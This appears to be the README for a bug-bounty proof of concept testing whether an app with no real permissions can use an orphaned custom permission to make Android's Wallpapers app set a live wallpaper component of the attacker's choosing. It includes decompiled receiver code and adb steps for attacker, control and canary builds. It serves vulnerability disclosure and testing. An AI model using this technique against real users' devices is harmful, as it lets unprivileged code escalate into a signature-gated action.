# Wallpapers: a permissionless app selects the live wallpaper component

## What this tests

`com.google.android.apps.wallpaper` exports a broadcast receiver guarded by a
permission that no package on the device defines:

```xml
<receiver android:name="com.google.android.apps.wallpaper.module.DownloadableRestorer"
          android:permission="com.google.pixel.livewallpaper.permission.DOWNLOAD_LIVE_WALLPAPER"
          android:exported="true">
    <intent-filter>
        <action android:name="com.google.android.apps.wallpaper.action.RESTORE_DOWNLOADABLE"/>
    </intent-filter>
</receiver>
```

An undefined permission can be defined by any app, at `protectionLevel="normal"`,
and is then granted to it at install with no prompt and no user interaction.

What the receiver does with the broadcast, decompiled from the installed APK:

```java
Object extra  = intent.getExtra("android.live_wallpaper.info");
int    target = intent.getIntExtra("android.live_wallpaper.restore_target", 0);
LiveWallpaperInfo info = new LiveWallpaperInfo((WallpaperInfo) extra);
...
WallpaperSetter.setWallpaperComponent(wallpaperManager, info, target);
```

and that helper:

```java
wallpaperManager.setWallpaperComponentWithFlags(
        liveWallpaperInfo.mInfo.getComponent(), WallpaperPersister.destinationToFlags(i));
```

`setWallpaperComponent` and `setWallpaperComponentWithFlags` require
`android.permission.SET_WALLPAPER_COMPONENT`, which is `signature|privileged`.
The Wallpapers app holds it; a third-party app cannot. The `ComponentName`
passed to it is taken from the broadcast extra without any check of where the
broadcast came from.

So the question this PoC answers is not "can I reach the receiver". It is:
can an app that holds no real permission make a privileged app perform a
signature-gated action with an argument of the attacker's choosing.

## Three builds

| build | package | has the permission | has a wallpaper service |
|---|---|---|---|
| `attacker` | `com.cindrasec.wallpaperpoc` | yes | no |
| `control`  | `com.cindrasec.wallpaperctl` | no  | no |
| `canary`   | `com.cindrasec.wallpapercan` | yes | yes |

`attacker` and `control` differ in the permission and nothing else — that pair
is the measurement. `canary` adds a component, so it is a separate build and
answers a separate question.

```sh
./build.sh pair          # attacker + control
./build.sh canary        # only needed for the escalation step
```

Needs the same toolchain as `../mvrp-probe` (JDK, aapt2, d8, apksigner, a
platform `android.jar` with `resources.arsc`). See that README if a tool is
missing. If d8 dies with an internal error on the canary build, retry it as
`D8FLAGS=--no-desugaring ./build.sh canary`.

## Run it, on the latest OS first

The Mobile VRP rules exclude anything that does not work on the latest
available OS version, so the Android 16 device is the one that counts.

```sh
export ANDROID_SERIAL=ZT422724JR          # the Android 16 phone

adb install -r out/attacker/com.cindrasec.wallpaperpoc.apk
adb install -r out/control/com.cindrasec.wallpaperctl.apk
```

Step 1 — the permission really is granted, from the device's own records:

```sh
adb shell dumpsys package com.cindrasec.wallpaperpoc | grep -A20 'install permissions'
```

Step 2 — pick a target, because this pair of builds carries no wallpaper
service of its own:

```sh
adb logcat -c
adb shell am start -n com.cindrasec.wallpaperpoc/.MainActivity --es action list
adb logcat -d -s WPPOC | tail -20
```

Choose one that prints `OK` and is not the one currently set. Call it `$T`.

Step 3 — what the wallpaper is before anything is sent:

```sh
adb shell dumpsys wallpaper | grep -iE 'wallpaperComponent|mName|Wallpaper component'
```

Step 4 — the control first, so a success later cannot be explained by the
receiver simply being open:

```sh
adb logcat -c
adb shell am start -n com.cindrasec.wallpaperctl/com.cindrasec.wallpaperpoc.MainActivity \
    --es action set --es target "$T"
sleep 3
adb logcat -d -s WPPOC BroadcastQueue ActivityManager | tail -30
adb shell dumpsys wallpaper | grep -iE 'wallpaperComponent|mName|Wallpaper component'
```

Expected: a `Permission Denial` line naming
`com.google.pixel.livewallpaper.permission.DOWNLOAD_LIVE_WALLPAPER`, and the
wallpaper unchanged.

Step 5 — the attacker build, same command, one package name different:

```sh
adb logcat -c
adb shell am start -n com.cindrasec.wallpaperpoc/.MainActivity \
    --es action set --es target "$T"
sleep 3
adb logcat -d -s WPPOC BroadcastQueue ActivityManager | tail -30
adb shell dumpsys wallpaper | grep -iE 'wallpaperComponent|mName|Wallpaper component'
```

The result that would make this a finding: `mWallpaperComponent` now names
`$T`, set by an app holding no permission that entitles it to choose a
wallpaper component, while the identical app without the orphaned permission
was refused.

Step 6, only if step 5 worked — the escalation: aim it at the attacker's own
code instead of something already installed.

```sh
adb install -r out/canary/com.cindrasec.wallpapercan.apk
adb logcat -c
adb shell am start -n com.cindrasec.wallpapercan/com.cindrasec.wallpaperpoc.MainActivity \
    --es action set
sleep 3
adb logcat -d -s WPPOC | tail -20
adb shell dumpsys wallpaper | grep -iE 'wallpaperComponent|mName'
```

Looking for:

```
WPPOC: canary engine created by the system: uid=... pid=...
```

i.e. the unprivileged app's own code started by the system as the live
wallpaper.

## Reverting

Pick any wallpaper in Settings, or:

```sh
adb shell am start -a android.intent.action.SET_WALLPAPER
adb uninstall com.cindrasec.wallpaperpoc
adb uninstall com.cindrasec.wallpaperctl
adb uninstall com.cindrasec.wallpapercan
```

## What would kill this

Decided before running, so the answer cannot be argued into existence later:

- The control build also sets the wallpaper. Then the receiver is open to
  everyone and the orphaned permission is irrelevant — there is no bypass.
- The broadcast is accepted but `dumpsys wallpaper` does not change. Then
  something below the receiver rejected it, as happened with AGSA (S55), and
  reaching the receiver is a precondition, not a finding.
- It works on Android 15 but not on Android 16. The rules exclude anything
  that does not work on the latest available OS version.
- The device's Wallpapers app is not the one published by Google LLC. Check
  with `adb shell pm list packages -i | grep wallpaper`; a Motorola build of a
  different app is out of scope for this program.

## Safety

The canary draws one colour and logs one line. It reads nothing, sends
nothing, and touches no other app's data. The only state it changes is which
wallpaper is showing on the researcher's own test device.
